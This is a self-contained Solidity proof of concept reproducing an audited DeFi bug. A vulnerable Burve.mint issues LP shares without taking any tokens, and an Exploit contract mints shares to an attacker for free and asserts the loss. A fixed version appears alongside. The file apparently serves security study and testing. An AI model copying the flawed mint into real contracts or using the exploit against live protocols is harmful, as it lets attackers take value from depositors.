// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Burve — island.mint is called without a token transfer
    (Pashov Audit Group, H-01, finding 55212, review 2025-01-29).

    SYNTHETIC, cheatcode-free. Island.mint keeps the reported loop and then
    _mint(recipient, liq). It does not pull tokens. Burve.mint calls it
    without transferring any in, so the attacker receives `liq` shares while
    the island's underlying balance stays 0. The control transfers `liq`
    underlying from the caller first, so the attacker must pay. */

contract Token {
    string public constant name = "Underlying";
    string public constant symbol = "UND";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract Island {
    string public constant name = "Island LP";
    string public constant symbol = "ILP";
    uint8 public constant decimals = 18;

    Token public immutable underlying;
    uint256[] public distX96;
    uint256[] public ranges;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    uint256 public lastRangeBalance;
    uint256 public lastRange;
    address public lastRecipient;
    uint128 public lastLiqAmount;

    constructor(Token _underlying) {
        underlying = _underlying;
        distX96.push(uint256(1) << 96);
        ranges.push(1);
    }

    function shift96(uint256 x, bool roundUp) internal pure returns (uint256) {
        uint256 mask = (uint256(1) << 96) - 1;
        if (roundUp && (x & mask) != 0) return (x >> 96) + 1;
        return x >> 96;
    }

    function mint(address recipient, uint128 liq) external {
        for (uint256 i = 0; i < distX96.length; ++i) {
            uint128 liqAmount = uint128(shift96(liq * distX96[i], true));
            mintRange(ranges[i], recipient, liqAmount);
        }
        _mint(recipient, liq);
    }

    function mintRange(uint256 range, address recipient, uint128 liqAmount) internal {
        lastRangeBalance = underlying.balanceOf(address(this));
        lastRange = range;
        lastRecipient = recipient;
        lastLiqAmount = liqAmount;
    }

    function _mint(address to, uint256 amount) internal {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

contract Burve {
    Island public island;

    constructor(Island _island) {
        island = _island;
    }

    function mint(address recipient, uint128 liq) external {
        // @> VULN: island.mint is called with no token transfer, so shares are minted against an empty balance
        island.mint(recipient, liq);
    }
}

contract BurveFixed {
    Island public island;
    Token public immutable underlying;

    constructor(Island _island, Token _underlying) {
        island = _island;
        underlying = _underlying;
    }

    function mint(address recipient, uint128 liq) external {
        underlying.transferFrom(msg.sender, address(island), uint256(liq));
        island.mint(recipient, liq);
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 public constant N = 1000 ether;

    Token public underlying;
    Island public island;
    Burve public burve;

    uint256 public shares;
    uint256 public attackerUnderlying;
    uint256 public islandUnderlying;
    uint256 public emptyAtMint;

    constructor() {
        underlying = new Token();
        island = new Island(underlying);
        burve = new Burve(island);
    }

    function run() external {
        this.fundAttacker();
        this.readBefore();
        this.mintFree();
        this.readAfter();
        this.readEmpty();
        this.assertHarm();
    }

    function fundAttacker() external {
        underlying.mint(ATTACKER, N);
    }

    function readBefore() external {
        attackerUnderlying = underlying.balanceOf(ATTACKER);
    }

    function mintFree() external {
        burve.mint(ATTACKER, uint128(N));
    }

    function readAfter() external {
        shares = island.balanceOf(ATTACKER);
        attackerUnderlying = underlying.balanceOf(ATTACKER);
        islandUnderlying = underlying.balanceOf(address(island));
    }

    function readEmpty() external {
        emptyAtMint = island.lastRangeBalance();
    }

    function assertHarm() external {
        require(shares == N, "shares");
        require(attackerUnderlying == N, "attacker paid");
        require(islandUnderlying == 0, "island was funded");
        require(emptyAtMint == 0, "range saw tokens");
    }
}
